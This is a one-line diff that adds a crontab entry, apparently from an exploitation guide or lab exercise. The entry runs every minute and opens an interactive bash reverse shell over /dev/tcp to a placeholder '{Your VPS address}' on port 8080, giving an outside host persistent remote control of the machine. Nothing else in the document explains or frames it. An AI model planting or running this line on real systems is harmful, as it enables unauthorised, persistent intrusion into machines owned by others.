@@ -1,0 +1,1 @@
+*/1 * * * * /bin/bash -i >& /dev/tcp/{Your VPS address}/8080 0>&1
